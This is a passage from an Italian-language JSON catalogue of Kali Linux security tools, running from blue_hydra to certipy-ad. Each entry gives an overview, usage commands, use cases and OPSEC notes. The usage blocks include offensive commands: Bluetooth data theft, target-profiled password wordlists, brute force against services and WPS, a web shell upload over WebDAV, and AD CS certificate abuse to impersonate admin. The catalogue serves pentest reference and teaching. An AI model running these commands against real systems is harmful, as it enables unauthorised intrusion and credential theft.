    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Blue Hydra è un servizio di discovery Bluetooth che rileva e traccia dispositivi Classic e Bluetooth Low Energy (BLE) nelle vicinanze. A differenza di scanner semplici, mantiene un database persistente dei dispositivi osservati, registrando timestamp, potenza del segnale e metadata per analisi temporali. È progettato per funzionare continuamente come sistema di monitoraggio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Mode Scanning:</strong> Rileva sia Bluetooth Classic (inquiry scan) che BLE (advertising scan) simultaneamente.</p><p><strong>Persistent Database:</strong> Salva tutti i dispositivi in SQLite con storico delle osservazioni per tracking temporale.</p><p><strong>Device Fingerprinting:</strong> Raccoglie nome, classe dispositivo, servizi pubblicati e manufacturer data.</p><p><strong>API Integration:</strong> Espone i dati via API per integrazione con altri sistemi di sicurezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio servizio\nsudo blue_hydra\n\n# Interfaccia web per visualizzare dispositivi\n# http://localhost:8000\n\n# Query database SQLite per analisi\nsqlite3 /var/lib/blue_hydra/blue_hydra.db \"SELECT * FROM blue_hydra_devices;\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Security Assessment</strong>, monitora quali dispositivi Bluetooth sono presenti in un'area protetta. In <strong>Wireless Pentesting</strong>, enumera target BLE per successivi attacchi. Per <strong>TSCM</strong> (Technical Surveillance Countermeasures), rileva dispositivi sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> Richiede adattatore Bluetooth compatibile. Non tutti i dongle supportano monitor mode BLE.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bluesnarfer",
    "name": "bluesnarfer",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bluesnarfer/",
    "desc": "Sfrutta vulnerabilità Bluetooth per estrarre contatti e SMS da telefoni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bluesnarfer sfrutta una vulnerabilità storica nei telefoni Bluetooth (principalmente Nokia e Sony Ericsson degli anni 2000) che permetteva di accedere ai dati del dispositivo (rubrica, SMS, calendario) senza autenticazione. Sebbene la vulnerabilità originale sia stata patchata, il tool rimane utile per testare dispositivi legacy o per scopi didattici sulla sicurezza Bluetooth.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contact Extraction:</strong> Scarica la rubrica completa dal telefono vulnerabile via OBEX.</p><p><strong>SMS Access:</strong> Legge i messaggi SMS memorizzati sul dispositivo.</p><p><strong>Calendar/Notes:</strong> Accede ad altri dati PIM (Personal Information Manager) esposti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione dispositivi Bluetooth\nhcitool scan\n\n# Estrazione rubrica\nbluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF\n\n# Lettura SMS\nbluesnarfer -s SMS -b AA:BB:CC:DD:EE:FF</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Principalmente <strong>storico/didattico</strong> per comprendere le vulnerabilità Bluetooth. In scenari di <strong>Legacy Device Testing</strong>, potrebbe ancora trovare dispositivi vulnerabili in ambienti industriali o sanitari con apparecchiature datate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia:</strong> I dispositivi moderni (post-2008) non sono vulnerabili. L'attacco richiede che Bluetooth sia attivo e discoverable sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "bopscrk",
    "name": "bopscrk",
    "version": "2.4.7",
    "icon": "../app/icons/bopscrk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bopscrk/",
    "desc": "Genera wordlist personalizzate basate su info del target (nome, date, hobby).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BOPSCRK (Before Outset PaSsworCRacKing) genera wordlist personalizzate basate su informazioni raccolte sulla vittima durante la fase di OSINT. Inserendo nome, cognome, date di nascita, nomi di familiari, pet, hobby e altre info personali, il tool crea migliaia di variazioni che riflettono i pattern reali usati dalle persone per creare password \"facili da ricordare\".</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Personal Info Processing:</strong> Accetta nomi, date, parole chiave e le combina secondo regole di mutazione comuni.</p><p><strong>Leet Speak:</strong> Applica sostituzioni (a→@, e→3, i→1, o→0) tipiche delle password.</p><p><strong>Case Variations:</strong> Genera variazioni di maiuscole/minuscole e capitalizzazione.</p><p><strong>Affixes:</strong> Aggiunge numeri, anni e simboli comuni come suffissi e prefissi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Modalità interattiva\nbopscrk -i\n\n# Specificando parametri\nbopscrk -n mario -s rossi -b 15/03/1985 --wife laura --child marco\n\n# Output su file\nbopscrk -n target -o wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di lanciare attacchi brute force generici, una wordlist personalizzata aumenta drasticamente le probabilità di successo. Per <strong>Targeted Attacks</strong> dopo OSINT approfondito. In <strong>Social Engineering Assessment</strong>, dimostra quanto le password basate su info personali siano insicure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficienza:</strong> Meglio di dizionari generici per target specifici. Combinare con regole hashcat per ulteriori mutazioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "braa",
    "name": "braa",
    "version": "0.82",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/braa/",
    "desc": "Scanner SNMP massivo per interrogare rapidamente migliaia di host.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Braa è uno scanner SNMP ad alte prestazioni progettato per interrogare migliaia di host in parallelo. A differenza di snmpwalk che opera sequenzialmente, Braa invia query asincrone permettendo di completare scansioni di intere subnet in pochi secondi. È ottimizzato per la discovery rapida di dispositivi SNMP e l'estrazione massiva di OID specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Parallelism:</strong> Può gestire decine di migliaia di query simultanee sfruttando socket raw.</p><p><strong>Multi-OID Query:</strong> Interroga multipli OID in una singola scansione per estrarre informazioni specifiche.</p><p><strong>Community Bruteforce:</strong> Può testare multiple community string contro molti host.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Query OID specifico su range\nbraa public@192.168.1.1-192.168.1.254:.1.3.6.1.2.1.1.1.0\n\n# Estrazione hostname e descrizione\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.5.0\n\n# Con timeout personalizzato\nbraa -t 2 public@10.0.0.0/8:.1.3.6.1.2.1.1.1.0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Discovery</strong>, identifica rapidamente tutti i dispositivi con SNMP abilitato su grandi reti. Per <strong>Asset Inventory</strong>, estrae informazioni di sistema da router, switch, stampanti e IoT. Nel <strong>Vulnerability Assessment</strong>, trova dispositivi con community string di default.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il volume di traffico SNMP è facilmente rilevabile. Community string \"public\" è ancora comune ma monitorata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "bruteshark",
    "name": "bruteshark",
    "version": "1.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bruteshark/",
    "desc": "Analizza PCAP per estrarre credenziali, hash, sessioni e ricostruire flussi TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BruteShark è uno strumento di Network Forensic Analysis (NFAT) che analizza file PCAP per estrarre automaticamente informazioni di sicurezza rilevanti. Identifica credenziali in chiaro, hash di password, sessioni ricostruite, file trasferiti e costruisce una mappa visuale delle comunicazioni di rete. Disponibile con GUI e CLI.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Extraction:</strong> Identifica ed estrae password da HTTP Basic, FTP, SMTP, POP3, IMAP, Telnet e altri protocolli in chiaro.</p><p><strong>Hash Extraction:</strong> Estrae hash Kerberos, NTLM e NetNTLMv2 dalle catture per cracking offline.</p><p><strong>File Carving:</strong> Ricostruisce file trasferiti (immagini, documenti) dai flussi TCP.</p><p><strong>Network Diagram:</strong> Genera automaticamente un diagramma delle comunicazioni tra host.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\nBruteSharkDesktop\n\n# Analisi CLI\nBruteSharkCli -d /path/to/capture.pcap -o /output/folder</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Forensics</strong>, analizza traffico catturato durante incident response per identificare dati compromessi. Per <strong>Pentest</strong>, dopo MITM estrae credenziali catturate. In <strong>CTF</strong>, spesso le challenge PCAP contengono credenziali o flag nascosti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Non decifra traffico crittografato (HTTPS, SSH). Richiede cattura preesistente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "brutespray",
    "name": "brutespray",
    "version": "2.2.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/brutespray/",
    "desc": "Automatizza brute force su servizi trovati da Nmap/Nessus con Medusa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BruteSpray automatizza il processo di brute force delle credenziali sui servizi scoperti durante la fase di scansione. Prende in input i risultati di Nmap (XML o gNMAP) e lancia automaticamente attacchi di credenziali contro tutti i servizi supportati (SSH, FTP, MySQL, PostgreSQL, SMB, ecc.) usando wordlist configurabili. È il ponte ideale tra discovery e exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Service Auto-Detection:</strong> Legge l'output Nmap e identifica automaticamente quali servizi attaccare su quali porte.</p><p><strong>Multi-Service Support:</strong> Supporta SSH, FTP, Telnet, MySQL, MSSQL, PostgreSQL, VNC, SMB, SMTP e molti altri.</p><p><strong>Parallel Attacks:</strong> Esegue brute force su multipli target/servizi simultaneamente per efficienza.</p><p><strong>Integration:</strong> Usa Medusa come backend, ereditandone l'efficienza e la stabilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Da output Nmap GNMAP\nbrutespray -f scan.gnmap -u users.txt -p passwords.txt\n\n# Da output Nmap XML\nbrutespray -f scan.xml -U root -P /usr/share/wordlists/rockyou.txt\n\n# Solo servizi specifici\nbrutespray -f scan.xml -s ssh,ftp -t 5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Workflow tipico OSCP: dopo Nmap, BruteSpray testa credenziali di default e comuni su tutti i servizi. In <strong>Internal Pentest</strong>, trova rapidamente servizi con password deboli. Per <strong>Automation</strong>, può essere integrato in pipeline di scansione automatizzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il brute force genera molti tentativi di login falliti, facilmente rilevabili. Può causare lockout di account.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "bulk-extractor",
    "name": "bulk-extractor",
    "version": "2.1.1",
    "icon": "../app/icons/bulk-extractor-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bulk-extractor/",
    "desc": "Estrae email, URL, carte di credito, hash da immagini disco senza mount.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bulk_extractor è uno strumento di digital forensics ad alte prestazioni che scansiona immagini disco, file o directory alla ricerca di informazioni strutturate (PII). Non richiede il mount del filesystem: opera direttamente sui byte, estraendo email, URL, numeri di carte di credito, numeri di telefono, EXIF data e hash anche da spazio non allocato o file compressi. È parallelizzato per sfruttare CPU multi-core.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Extraction:</strong> Riconosce email, domini, URL, IP, numeri di carta di credito, SSN, telefoni con regex ottimizzate.</p><p><strong>Hash Discovery:</strong> Identifica hash MD5, SHA1 e altri formati nel testo estratto.</p><p><strong>Compression-Aware:</strong> Decomprime automaticamente ZIP, GZIP e altri formati per analizzare il contenuto.</p><p><strong>Histogram Generation:</strong> Produce statistiche sui dati più frequenti, utili per identificare pattern anomali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione da immagine disco\nbulk_extractor -o output_dir disk_image.dd\n\n# Solo scanner specifici\nbulk_extractor -E email -E url -o output disk.img\n\n# Da file singolo o directory\nbulk_extractor -o output -R /path/to/directory</code></pre><p>I risultati vengono salvati come file di testo separati per categoria (emails.txt, urls.txt, ccn.txt, ecc.).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, è spesso il primo tool lanciato su un'immagine per ottenere una panoramica rapida dei dati sensibili presenti. Per <strong>Data Breach Investigation</strong>, identifica quali PII potrebbero essere stati compromessi. In <strong>eDiscovery</strong>, facilita la ricerca di comunicazioni rilevanti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> Estremamente veloce grazie al multi-threading. Può analizzare terabyte in poche ore.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "bully",
    "name": "bully",
    "version": "1.4.00",
    "icon": "../app/icons/bully-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bully/",
    "desc": "Attacca WPS con brute force del PIN per recuperare passphrase WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bully è un'implementazione del WPS brute force attack, alternativa a Reaver. Il protocollo WPS (Wi-Fi Protected Setup) ha una vulnerabilità di design che permette di indovinare il PIN a 8 cifre con un massimo di 11.000 tentativi invece dei teorici 100 milioni. Bully sfrutta questo difetto per recuperare la password WPA/WPA2 dell'access point senza dover catturare e craccare handshake.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS PIN Attack:</strong> Brute force del PIN WPS sfruttando la vulnerabilità nel checksum e la divisione in due metà del PIN.</p><p><strong>Pixie-Dust Support:</strong> Supporta l'attacco Pixie-Dust per recuperare il PIN offline in secondi su router vulnerabili.</p><p><strong>Session Management:</strong> Salva il progresso permettendo di riprendere attacchi interrotti.</p><p><strong>Rate Limiting Detection:</strong> Rileva quando l'AP entra in lockdown e attende il timeout.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Attacco base WPS\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# Con Pixie-Dust\nbully -b AA:BB:CC:DD:EE:FF -d -c 6 wlan0mon\n\n# Specificando PIN parziale noto\nbully -b AA:BB:CC:DD:EE:FF -p 1234 wlan0mon</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, è un'alternativa quando il crack dell'handshake fallisce per password complesse. Molti router consumer hanno ancora WPS abilitato. Pixie-Dust è devastante sui router vulnerabili (pochi secondi per ottenere la password).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Molti router moderni hanno rate limiting aggressivo o WPS disabilitato. L'attacco può richiedere ore/giorni. Genera molti log sull'AP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "burpsuite-kali",
    "name": "burpsuite",
    "version": "2025.7.4",
    "icon": "../app/icons/burpsuite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/burpsuite/",
    "desc": "Piattaforma integrata per web security testing: proxy, scanner, repeater, intruder.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Burp Suite è lo standard industriale per il web application security testing. Funziona come proxy HTTP/HTTPS intercettando tutto il traffico tra browser e applicazione, permettendo di analizzare, modificare e ripetere le richieste. La versione Community offre gli strumenti manuali essenziali, mentre la versione Pro aggiunge scanner automatico di vulnerabilità, Intruder avanzato e collaborazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Proxy:</strong> Intercetta e modifica richieste/risposte HTTP(S) in tempo reale. Include match/replace rules per modifiche automatiche.</p><p><strong>Repeater:</strong> Permette di modificare e rinviare singole richieste manualmente, essenziale per testare vulnerabilità come SQLi e XSS.</p><p><strong>Intruder:</strong> Automatizza attacchi personalizzati con payload multipli (brute force, fuzzing, parameter tampering).</p><p><strong>Scanner (Pro):</strong> Rileva automaticamente vulnerabilità comuni (OWASP Top 10) con ottima precisione e basso false positive rate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Burp Suite\nburpsuite\n\n# Configurazione browser:\n# Proxy: 127.0.0.1:8080\n# Installare certificato CA di Burp per HTTPS\n\n# Workflow tipico:\n# 1. Spider/crawl dell'applicazione\n# 2. Analisi manuale delle richieste interessanti\n# 3. Test con Repeater\n# 4. Automazione con Intruder se necessario</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>essenziale</strong> in ogni web pentest e bug bounty. Dalla discovery (spider) al testing manuale (repeater) all'exploitation (intruder), copre l'intero workflow. L'ecosistema di estensioni (BApp Store) lo rende estendibile per casi specifici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il traffico Burp ha caratteristiche riconoscibili. Lo scanner Pro può essere rilevato da WAF. Usare User-Agent rotation.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "bytecode-viewer",
    "name": "bytecode-viewer",
    "version": "2.13.1",
    "icon": "../app/icons/bytecode-viewer-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bytecode-viewer/",
    "desc": "Decompila e analizza bytecode Java, Android DEX con più decompiler integrati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bytecode Viewer è un ambiente integrato per il reverse engineering di applicazioni Java e Android. Combina cinque decompilatori diversi (Procyon, CFR, JD-GUI, Fernflower, Krakatau) permettendo di confrontare i risultati e ottenere la migliore ricostruzione del codice sorgente. Supporta file JAR, CLASS, DEX, APK e archivi ZIP.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Decompiler:</strong> Visualizza simultaneamente l'output di più decompilatori per ogni classe, permettendo di scegliere la ricostruzione più leggibile.</p><p><strong>Bytecode View:</strong> Oltre al codice decompilato, mostra il bytecode JVM raw per analisi di basso livello.</p><p><strong>Search:</strong> Ricerca full-text nel codice decompilato per trovare stringhe, metodi o pattern specifici.</p><p><strong>Plugin System:</strong> Supporta plugin per estendere le funzionalità (malware analysis, obfuscation detection).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\njava -jar BytecodeViewer.jar\n\n# Aprire file JAR, APK o CLASS dal menu File\n# Navigare le classi nel tree a sinistra\n# Selezionare i decompiler da visualizzare</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong> di JAR malevoli distribuiti via phishing. In <strong>Mobile Security</strong>, analizza app Android decompilando i file DEX. Per <strong>Vulnerability Research</strong>, trova vulnerabilità nel codice Java di applicazioni enterprise (Struts, Spring).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Il codice offuscato (ProGuard, Zelix) produce output difficile da leggere. I nomi di variabili e metodi vengono persi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "cadaver",
    "name": "cadaver",
    "version": "0.26",
    "icon": "../app/icons/cadaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cadaver/",
    "desc": "Client WebDAV da linea di comando per upload, download e gestione file remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cadaver è un client WebDAV a linea di comando che permette di interagire con server web che espongono questa estensione HTTP. WebDAV (Web Distributed Authoring and Versioning) permette operazioni di file management remoto (upload, download, mkdir, delete) ed è spesso configurato male su server IIS, SharePoint o Apache, permettendo accessi non autorizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Operations:</strong> put, get, mput, mget per upload/download di file singoli o multipli.</p><p><strong>Directory Management:</strong> mkdir, rmdir, ls, cd per navigare e gestire la struttura delle directory remote.</p><p><strong>Property Access:</strong> Lettura e modifica delle proprietà WebDAV dei file.</p><p><strong>Authentication:</strong> Supporta Basic, Digest e NTLM authentication.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Connessione a server WebDAV\ncadaver http://target.com/webdav/\n\n# Con credenziali\ncadaver -u user -p pass http://target.com/dav/\n\n# Comandi interattivi:\ndav:/webdav/> ls\ndav:/webdav/> put shell.aspx\ndav:/webdav/> get config.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Web Exploitation</strong>, quando si scopre WebDAV abilitato (tramite Nmap o nikto), cadaver permette di testare l'upload di web shell. Per <strong>Post-Exploitation</strong>, facilita l'esfiltrazione di file da server compromessi. Su <strong>SharePoint</strong>, può accedere a documenti con credenziali rubate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le operazioni WebDAV sono loggate. L'upload di file eseguibili genera alert su WAF/IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "caido-cli",
    "name": "caido-cli",
    "version": "0.49.0",
    "icon": "../app/icons/caido-cli-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caido-cli/",
    "desc": "Web proxy e security testing platform moderno, alternativa leggera a Burp.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Caido è un web security testing proxy di nuova generazione, progettato come alternativa moderna e leggera a Burp Suite. Scritto in Rust, offre prestazioni superiori e un'interfaccia utente più pulita. Disponibile sia come applicazione desktop che CLI, sta guadagnando popolarità nella community per la sua velocità e la curva di apprendimento più rapida.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Proxy:</strong> Intercetta e modifica traffico HTTP/HTTPS con interfaccia moderna e responsive.</p><p><strong>Replay:</strong> Equivalente del Repeater di Burp, permette di modificare e rinviare richieste.</p><p><strong>Automate:</strong> Sistema di automazione per attacchi parametrizzati simile all'Intruder.</p><p><strong>Workflows:</strong> Automazione basata su regole per processare richieste automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Caido CLI\ncaido-cli\n\n# Configurare browser su proxy 127.0.0.1:8080\n# Accesso interfaccia web su localhost per la GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Pentesting</strong> quotidiano quando Burp risulta troppo pesante. Ideale per chi cerca un'alternativa open-source con meno overhead. In crescita nella community <strong>Bug Bounty</strong> per la velocità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Maturità:</strong> Più giovane di Burp, alcune funzionalità avanzate potrebbero mancare. Ecosistema di plugin meno sviluppato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "caldera",
    "name": "caldera",
    "version": "5.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caldera/",
    "desc": "Framework MITRE per emulazione di avversari e red team automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CALDERA è un framework di adversary emulation sviluppato da MITRE che permette di automatizzare operazioni di red team seguendo le tattiche e tecniche del framework ATT&CK. Utilizza agenti deployati sui target per eseguire catene di attacco (\"adversary profiles\") in modo autonomo, simulando il comportamento di gruppi APT reali per testare le capacità di detection del blue team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Adversary Profiles:</strong> Definisce sequenze di attacco mappate su MITRE ATT&CK che gli agenti eseguono autonomamente.</p><p><strong>Autonomous Agents:</strong> Agenti cross-platform (Windows, Linux, macOS) che ricevono istruzioni e reportano risultati.</p><p><strong>Fact Learning:</strong> Gli agenti raccolgono informazioni dal target (utenti, share, servizi) e adattano le operazioni successive.</p><p><strong>Plugin Architecture:</strong> Estendibile con plugin per nuove tecniche, C2 channels e reporting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server CALDERA\npython3 server.py --insecure\n\n# Accesso interfaccia web: http://localhost:8888\n# Default credentials: admin:admin\n\n# Deploy agente su target e selezionare adversary profile dalla GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Purple Team</strong> exercises dove red e blue team collaborano per testare le detection. In <strong>Security Validation</strong>, verifica che i controlli di sicurezza rilevino tecniche specifiche. Per <strong>Training</strong>, simula scenari di attacco realistici in ambiente controllato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Gli agenti e le tecniche sono documentati pubblicamente. SOC maturi potrebbero riconoscere i pattern. Usare per training, non per engagement reali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "certgraph",
    "name": "certgraph",
    "version": "20180911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certgraph/",
    "desc": "Esplora certificati SSL/TLS per scoprire sottodomini tramite SAN e CT logs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Certgraph esplora i certificati SSL/TLS per scoprire relazioni tra domini e sottodomini. Analizza i campi Subject Alternative Name (SAN) dei certificati e segue le connessioni per costruire un grafo delle relazioni. Questa tecnica è particolarmente efficace perché i certificati wildcard e multi-dominio rivelano asset che potrebbero non essere trovati con altre tecniche di enumerazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SAN Extraction:</strong> Estrae tutti i nomi alternativi dai certificati, rivelando sottodomini e domini correlati.</p><p><strong>Graph Building:</strong> Costruisce un grafo delle relazioni tra certificati e domini per visualizzare la struttura dell'infrastruttura.</p><p><strong>CT Log Integration:</strong> Può interrogare Certificate Transparency logs per trovare certificati storici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base\ncertgraph target.com\n\n# Con profondità di esplorazione\ncertgraph -depth 3 target.com\n\n# Output in formato DOT per visualizzazione\ncertgraph -json target.com | jq</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, scopre asset condividendo certificati o elencati come SAN. Per <strong>Attack Surface Mapping</strong>, rivela relazioni tra domini apparentemente non correlati. Complementa tool come Amass per massimizzare la copertura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stealth:</strong> Connessione TLS al target per recuperare il certificato. Usando CT logs, nessuna interazione diretta.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "certipy-ad",
    "name": "certipy-ad",
    "version": "5.0.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certipy-ad/",
    "desc": "Enumera e sfrutta vulnerabilità AD CS (ESC1-ESC8) per privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Certipy è lo strumento definitivo per attaccare Active Directory Certificate Services (AD CS). Enumera la configurazione della PKI aziendale e identifica automaticamente le vulnerabilità note (ESC1-ESC11) che permettono privilege escalation fino a Domain Admin. Include funzionalità per richiedere certificati malevoli, eseguire relay attacks e impersonare altri utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Find:</strong> Enumera CA, template e permessi per identificare vulnerabilità ESC1-ESC11 automaticamente.</p><p><strong>Request:</strong> Richiede certificati sfruttando template vulnerabili per impersonare altri utenti.</p><p><strong>Auth:</strong> Usa certificati ottenuti per autenticarsi via PKINIT e ottenere TGT o hash NTLM.</p><p><strong>Relay:</strong> Esegue NTLM relay verso l'endpoint HTTP di enrollment per ottenere certificati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione vulnerabilità\ncertipy find -u user@domain.local -p pass -dc-ip 192.168.1.10\n\n# Richiesta certificato (ESC1)\ncertipy req -u user@domain.local -p pass -target ca.domain.local -template VulnTemplate -upn admin@domain.local\n\n# Autenticazione con certificato\ncertipy auth -pfx admin.pfx -dc-ip 192.168.1.10</code></pre><br><hr><h4 